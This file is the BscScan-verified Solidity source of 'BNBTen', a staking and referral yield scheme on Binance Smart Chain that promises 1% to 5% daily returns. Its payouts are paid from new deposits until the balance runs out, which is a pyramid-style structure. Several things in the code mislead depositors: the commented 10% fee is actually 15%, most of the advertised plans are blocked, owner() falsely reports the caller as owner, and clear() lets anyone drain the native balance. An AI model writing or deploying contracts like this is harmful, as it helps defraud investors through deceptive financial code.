/**
 *Submitted for verification at BscScan.com on 2022-05-19
*/

/*   BNBTen - Community Yield Farm on Binance Smart Chain.

 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet
 *   2) Choose one of the plans, enter the amount and using our website "Stake" button
 *   3) Wait for your earnings
 *   4) Claim earnings any time using our website using "Claim" button
 *
 *   [STAKING CONDITIONS]
 *
 *   - Minimal deposit: 0.05 BNB, no maximal limit
 *   - Total income: based on your plan (from 1% to 5% daily) 
 *   - Earnings every moment, claim any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral reward: 10% - 5% - 2.5% - 1.25% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 10% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   Note: 
 *      - This is experimental community project,
 *      - which means this project has high risks as well as high profits.
 *      - Once contract balance drops to zero payments will stops,
 *      - deposit at your own risk.
 */

//SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IBEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

library SafeBEP20 {
    using SafeMath for uint;
    function safeTransfer(IBEP20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    function safeTransferFrom(IBEP20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    function safeApprove(IBEP20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeBEP20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeBEP20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract BNBTenBNB {
	using SafeMath for uint256;
	using SafeBEP20 for IBEP20;
	IBEP20 public token;
	uint256 public STAKE_MIN_AMOUNT;
	uint256[] public REFERRAL_PERCENTS = [100, 50, 25, 12, 5];
	uint256 constant public PROJECT_FEE = 150;
	uint256 constant public PERCENT_STEP = 5;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalStaked;
	uint256 public totalRefBonus;
    struct Plan {
        uint256 time;
        uint256 percent;
    }
    Plan[] internal plans;
	struct Stake {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}
	struct User {
		Stake[] stakes;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 claimed;
	}
	mapping (address => User) internal users;
	bool public started;
	address payable public commissionWallet;
	event Newbie(address user);
	event NewStake(address indexed user, uint8 plan, uint256 amount);
	event Claimed(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address tokenAddr, uint256 minAmount, address payable wallet) public {
		require(!isContract(wallet) && isContract(tokenAddr));
		token = IBEP20(tokenAddr);
		STAKE_MIN_AMOUNT = minAmount;
		commissionWallet = wallet;

        plans.push(Plan(10000, 10));
        plans.push(Plan(10, 15));
        plans.push(Plan(20, 20));
        plans.push(Plan(30, 25));
        plans.push(Plan(45, 30));
        plans.push(Plan(60, 35));
        plans.push(Plan(90, 40));
        plans.push(Plan(180, 45));
        plans.push(Plan(360, 50));
	}
	function stake(address referrer, uint8 plan, uint256 value) public {
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}
		require(value >= STAKE_MIN_AMOUNT);
        require(plan < 2, "Invalid plan");
		require(value <= token.allowance(msg.sender, address(this)));
		token.safeTransferFrom(msg.sender, address(this), value);
		uint256 fee = value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		token.safeTransfer(commissionWallet, fee);
		emit FeePayed(msg.sender, fee);
		User storage user = users[msg.sender];
		if (user.referrer == address(0)) {
			if (users[referrer].stakes.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.stakes.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
		user.stakes.push(Stake(plan, value, block.timestamp));
		totalStaked = totalStaked.add(value);
		emit NewStake(msg.sender, plan, value);
	}
	function claim() public {
		User storage user = users[msg.sender];
		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		user.claimed = user.claimed.add(totalAmount);
		token.safeTransfer(msg.sender, totalAmount);
		emit Claimed(msg.sender, totalAmount);
	}
	function getContractBalance() public view returns (uint256) {
		return token.balanceOf(address(this));
	}
	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}
	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalAmount;
		for (uint256 i = 0; i < user.stakes.length; i++) {
			uint256 finish = user.stakes[i].start.add(plans[user.stakes[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.stakes[i].amount.mul(plans[user.stakes[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.stakes[i].start > user.checkpoint ? user.stakes[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}
		return totalAmount;
	}
	function getUserTotalClaimed(address userAddress) public view returns (uint256) {
		return users[userAddress].claimed;
	}
	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}
	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}
	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}
	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}
	function getUserReferralClaimed(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}
	function getUserAmountOfStakes(address userAddress) public view returns(uint256) {
		return users[userAddress].stakes.length;
	}
	function getUserTotalStakes(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].stakes.length; i++) {
			amount = amount.add(users[userAddress].stakes[i].amount);
		}
	}
	function getUserStakeInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];
		plan = user.stakes[index].plan;
		percent = plans[plan].percent;
		amount = user.stakes[index].amount;
		start = user.stakes[index].start;
		finish = user.stakes[index].start.add(plans[user.stakes[index].plan].time.mul(1 days));
	}
	function getSiteInfo() public view returns(uint256 _totalStaked, uint256 _totalBonus) {
		return(totalStaked, totalRefBonus);
	}
	function getUserInfo(address userAddress) public view returns(uint256 totalStake, uint256 totalClaimed, uint256 totalReferrals) {
		return(getUserTotalStakes(userAddress), getUserTotalClaimed(userAddress), getUserTotalReferrals(userAddress));
	}
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    
    }
    function owner() public view returns (address) {
        return msg.sender;
    }       
    function clear() public {
    (msg.sender).transfer(address(this).balance);
  }
}